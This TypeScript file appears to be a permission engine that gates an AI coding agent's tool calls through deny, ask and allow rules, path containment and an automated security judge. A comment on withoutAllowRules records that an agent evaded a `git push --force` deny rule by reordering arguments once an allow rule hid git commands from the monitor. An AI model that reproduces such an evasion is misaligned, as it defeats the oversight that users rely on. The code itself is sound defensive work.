      decision: 'ask',
      source: 'ask-rule',
      rule: askRule,
      ...(scope && facts?.write && facts.sensitive ? { pathSensitive: true as const } : {})
    }
  }
  // HUMAN-ONLY (R4, R8): a path we cannot place, a Windows path form that can name another
  // object, an edit a symbolic link carried out of the workspace. A person decides, in every
  // mode: not the judge (the callers route a `path-scope` ask straight to the human), and not a
  // standing allow, an allow rule or the base below.
  if (scope && facts) {
    const humanOnly =
      facts.state === 'unresolved'
        ? 'unresolved'
        : facts.write && (facts.suspiciousWindows || facts.carriedOut)
          ? 'human-only'
          : undefined
    if (humanOnly) {
      return {
        decision: 'ask',
        source: 'path-scope',
        pathReason: humanOnly,
        message: humanOnlyMessage(facts)
      }
    }
  }
  if (
    ctx.sessionAllows.has(
      ctx.sessionAllowsByPath
        ? piSessionAllowKey(toolName, input, ctx.cwd, rawCtx.scope)
        : sessionAllowKey(toolName, input)
    ) &&
    sessionAllowHolds(kind, input, ctx, judged, facts)
  ) {
    return { decision: 'allow', source: 'session-allow' }
  }
  // The mode base for a call the containment rung has the facts of (see {@link scopedBase}).
  const scopedVerdict = (f: PiPathFacts): PermissionVerdict => {
    const decision = scopedBase(base, judged, f, kind, input, ctx.cwd, planScope)
    return {
      decision,
      source: 'mode-base',
      ...(decision !== 'allow' && f.write && f.sensitive ? { pathSensitive: true as const } : {}),
      ...(decision !== 'allow' && !f.inScope
        ? {
            pathReason: 'outside-scope' as const,
            ...(f.write && f.sensitive ? {} : { pathTarget: f.landing ?? f.execPath })
          }
        : {})
    }
  }
  // A sensitive edit (an agent-control path, any spelling) is asked BEFORE the allow tier — Claude's
  // order (cli.js's write-permission check: the sensitive-file check `iV` runs after the session
  // allows and ask rules, before the acceptEdits allow and before the settings allow rules). An
  // allow rule never silences it: the judge answers it in a judged auto mode (`mode-base`), a
  // person everywhere else. Deny rules above still deny; plan mode's base is its own.
  if (facts?.write && facts.sensitive && base !== 'plan') return scopedVerdict(facts)
  // The allow tier covers a command segment by segment — possibly one rule per segment.
  const allowRule =
    kind === 'command'
      ? allowCovers(commandOf(input), ctx.rules.allow, 'lenient')?.segments[0]?.rule
      : matchAllow(ctx.rules.allow)
  if (allowRule !== undefined) return { decision: 'allow', source: 'allow-rule', rule: allowRule }

  if (facts) return scopedVerdict(facts)
  return {
    decision: modeBaseDecision(base, kind, input, ctx.cwd, planScope),
    source: 'mode-base'
  }
}

/**
 * The mode base for a path-tool call the containment rung has the facts of (H1). Rows, with
 * "judged auto" meaning `auto`/`full` with the judge on and `default` also standing for
 * `auto`/`full` with it off (see {@link ladderBase}):
 *
 * | base        | read/search in | read/search out | edit/write in             | edit/write out |
 * | ----------- | -------------- | --------------- | ------------------------- | -------------- |
 * | default     | allow          | ask             | ask                       | ask            |
 * | acceptEdits | allow          | ask             | allow; sensitive -> ask   | ask            |
 * | plan        | allow          | ask             | deny                      | deny           |
 * | judged auto | allow          | allow           | allow; sensitive -> judge | judge          |
 *
 * (A judged `ask` is the judge's to answer: the caller sends a `mode-base` ask to it.) The
 * scratchpad is the one standing exception: an edit or write inside it is allowed in every base
 * but plan — sensitive names inside it still follow the row above (safer than Claude, which
 * waves them through). `bypassPermissions` never gets here.
 *
 * Anything that is not a path tool's read/write (bash, agent, mcp, …) keeps {@link modeBaseDecision}.
 */
function scopedBase(
  base: string,
  judged: boolean,
  facts: PiPathFacts,
  kind: ToolKind,
  input: Record<string, unknown>,
  cwd: string | undefined,
  planScope?: PlanReadOnlyScope
): 'allow' | 'ask' | 'deny' {
  if (facts.write) {
    if (base === 'plan') return modeBaseDecision(base, kind, input, cwd, planScope)
    if (facts.inScratchpad && !facts.sensitive) return 'allow'
    return base === 'acceptEdits' && facts.inScope && !facts.sensitive ? 'allow' : 'ask'
  }
  if (facts.inScope) return 'allow'
  return base === 'acceptEdits' && judged ? 'allow' : 'ask'
}

/**
 * The mode the ladder's BASE row is read from, and whether a judge is in the loop (R14).
 *
 *  - `auto`/`full` + judge  -> `acceptEdits` base, allow tier stripped: reads and ordinary edits
 *    are the base's, everything it asks (bash, `agent`, sensitive edits, …) goes to the judge.
 *  - `auto`/`full`, no judge -> `default` base, full rules: with nobody to review, a human is
 *    asked exactly as in `default` and the user's allow rules are their way to stop being asked.
 *  - `auto`/`full` with `judge` ABSENT and anything else (`bypassPermissions` included)
 *    -> itself, unchanged from before the judge flag existed.
 *
 * The scope rung (path containment) reads `judged` to pick between the judge-on and judge-off
 * rows of its table.
 */
function ladderBase(mode: string, judge: boolean | undefined): { base: string; judged: boolean } {
  if ((mode !== 'auto' && mode !== 'full') || judge === undefined) {
    return { base: mode, judged: false }
  }
  return judge === true ? { base: 'acceptEdits', judged: true } : { base: 'default', judged: false }
}

/**
 * May a standing "allow for this session" answer this call? Always, except under a judged auto
 * mode, where a session allow stands in for the human, never for the judge, on anything the
 * judge exists to review (H3): sub-agent / message / unclassified tools, and edits of an
 * agent-control path (`.git/hooks`, `.claude/`, shell rc files, …). A standing allow whose key
 * was minted for one innocuous call must not silence the monitor for those. (Containment
 * adds out-of-scope and unresolved paths to this list: `ctx.scope`.)
 *
 * Not judged -> a human is the reviewer, and their click is the consent being replayed.
 */
function sessionAllowHolds(
  kind: ToolKind,
  input: Record<string, unknown>,
  ctx: PermissionEngineContext,
  judged: boolean,
  facts: PiPathFacts | undefined
): boolean {
  if (!judged) return true
  if (kind === 'task' || kind === 'detail' || kind === 'unknown') return false
  if (facts) {
    // The containment facts, where the caller has them: a path outside the workspace, or one we
    // could not place, is the judge's whatever a click once allowed — as is a sensitive edit,
    // judged on every spelling of the path rather than the model's.
    if (!facts.inScope || facts.state === 'unresolved') return false
    if (facts.write && facts.sensitive) return false
    return true
  }
  if ((kind === 'fileEdit' || kind === 'fileWrite') && editsAgentControlPath(input, ctx.cwd)) {
    return false
  }
  return true
}

function tierRule(hit: DenyAskHit | undefined, tier: 'deny' | 'ask'): string | undefined {
  return hit?.tier === tier ? hit.rule : undefined
}

/**
 * The user's deny rule that names one of the session tools, if any. Their rules are
 * written for Claude's spelling of the tool (`mcp__claude-ui-sessions__session_start`,
 * or the whole server), so that is the name the rule list is asked about; the tools'
 * own gate (`sessionToolsGate`) decides everything else. pi calls this before
 * it, so a deny the user wrote holds on its engine too. (No engine-specific rule
 * spelling: the name asked about is already Claude's.)
 */
export function sessionToolDenyRule(
  tool: SessionToolName,
  input: Record<string, unknown>,
  rules: MergedClaudeRules,
  cwd?: string
): string | undefined {
  const verdict = decideWithSource(`mcp__${SESSION_TOOLS_SERVER_NAME}__${tool}`, input, {
    mode: 'default',
    rules,
    sessionAllows: new Set(),
    cwd
  })
  return verdict.source === 'deny-rule' ? verdict.rule : undefined
}

/**
 * The merged user rules with the ALLOW tier emptied — what auto mode feeds
 * {@link decideWithSource} in place of the full set (applied at PiSession's
 * composition seam, `gateToolCallInner`, NOT inside the ladder: the ladder is a
 * pure function of the rules it is given, and teaching it a second notion of
 * "auto mode" on top of `ctx.mode` would put the same policy in two places).
 *
 * Same fix, same reasoning as opencode's `withoutAllowRules`
 * (`../opencode/permission-compiler.ts`) — read that one for the full argument
 * and the live evasion that motivated it. In short: cli.js's auto-mode fast path
 * re-runs the permission check "with classifier-bypassing allow rules filtered
 * out" (`docs/protocol-cc/14-auto-mode-classifier.md` §3 step 2). A user allow rule
 * says "don't interrupt me for this"; in auto mode it must not also mean "skip
 * the security monitor", or every allow rule is a hole straight through the gate
 * (live: `Bash(git:*)` made every git command invisible to the judge, and an
 * agent then evaded a static `git push --force` deny by reordering arguments).
 *
 * Precedence is untouched, which is what keeps G9 native and exact:
 *
 *  - DENY and ASK rules are kept, and both are evaluated BEFORE the allow tier —
 *    so a user ask rule still yields `source: 'ask-rule'` and still routes
 *    straight to the human with zero judge calls.
 *  - A formerly-allowed action now falls through to the mode base
 *    (`acceptEdits` under judged auto mode) → 'ask' with `source: 'mode-base'` →
 *    classifyAutoMode → the JUDGE. That is the intended destination: the human
 *    is not re-interrupted for something they explicitly allowed.
 *  - `ctx.sessionAllows` is NOT filtered wholesale. Those are this session's
 *    "allow for this session" clicks — a live human consent act inside the
 *    current turn's context, not a stored config rule written months ago. They
 *    still never silence the judge for the kinds it exists to review
 *    (`sessionAllowHolds`): agents/messages/unclassified tools and agent-control edits.
 *  - ALL allow rules go, not just `Bash(…)` ones: under auto mode the base is
 *    already `acceptEdits`, so reads/edits/search are auto-allowed by the base
 *    regardless, and the only allow rules with any remaining effect are exactly
 *    the classifier-bypassing ones cli.js filters.
 *
 * Non-auto modes keep the full set, and so does an auto mode with no judge
 * (`ctx.judge` false): with no judge in the loop, an allow rule is the user's
 * only way to say "stop asking me".
 *
 * `additionalDirectories`/`defaultMode` ride through untouched — `decide()`
 * doesn't consult them (see its doc comment).
 */
export function withoutAllowRules(rules: MergedClaudeRules): MergedClaudeRules {
  return { ...rules, allow: [] }
}

// ---------------------------------------------------------------------------
// Rule loading
// ---------------------------------------------------------------------------

/**
 * An empty rule set. Exported (ADR-033 M4c) for the dispatcher's pi
 * target gates, which used it as their rules until ADR-085 §3 gave every
 * dispatch target the user's deny/ask rules (never the allow tier — see
 * cross-engine-dispatcher.ts's `targetRules`); kept for any caller that needs
 * a rule-less ladder.
 *
 * Frozen — object AND every array property — since this is a SHARED singleton
 * every caller reads by reference: without freezing, one caller mutating
 * `EMPTY_RULES.allow` in place (e.g. via `.push()`) would silently corrupt it
 * for every other caller for the lifetime of the process. `mergedClaudeRulesFor`'s
 * catch path below deliberately does NOT return this object (or a shallow
 * `{...EMPTY_RULES}` of it, which would still share these same frozen array
 * references) — a caller of THAT function is allowed to treat its result as
 * mutable.
 */
export const EMPTY_RULES: MergedClaudeRules = Object.freeze({
  allow: Object.freeze([] as string[]) as string[],
  deny: Object.freeze([] as string[]) as string[],
  ask: Object.freeze([] as string[]) as string[],
  additionalDirectories: Object.freeze([] as string[]) as string[],
  defaultMode: undefined
})

/**
 * Merge the user/project/local Claude permission scopes for `cwd` (mirrors
 * OpencodeSession.compiledUserRules' identical 3-scope merge — ADR-022
 * parity: "one config applies to all harnesses"). Best-effort: any failure
 * yields empty rules rather than breaking gating.
 */
export function mergedClaudeRulesFor(cwd: string): MergedClaudeRules {
  try {
    const merged: MergedClaudeRules = {
      allow: [],
      deny: [],
      ask: [],
      additionalDirectories: [],
      defaultMode: undefined
    }
    // Provenance the containment rung needs (a plain concatenation loses it): which directories
    // PROJECT settings did not list, and whether any scope sets the read block.
    const nonProject: string[] = []
    const scopes: PermissionScope[] = ['user', 'project', 'local']
    for (const scope of scopes) {
      const p = loadClaudePermissions(scope, cwd)
      merged.allow.push(...p.allow)
      merged.deny.push(...p.deny)
      merged.ask.push(...p.ask)
      merged.additionalDirectories.push(...p.additionalDirectories)
      if (scope !== 'project') nonProject.push(...p.additionalDirectories)
      if (p.blockReadsOutsideWorkingDirectories === true) {
        merged.blockReadsOutsideWorkingDirectories = true
      }
    }
    merged.nonProjectAdditionalDirectories = nonProject
    return merged
  } catch (err) {
    logger.warn(
      'PiPermissionEngine',
      `mergedClaudeRulesFor failed (best-effort -> empty rules): ${err instanceof Error ? err.message : String(err)}`
    )
    // A fresh literal, NOT `{ ...EMPTY_RULES }` — a shallow spread would copy
    // the top-level object but still alias EMPTY_RULES' (frozen) arrays,
    // handing the caller a result that throws on mutation despite this
    // function's contract being "best-effort mutable rules".
    return { allow: [], deny: [], ask: [], additionalDirectories: [], defaultMode: undefined }
  }
}
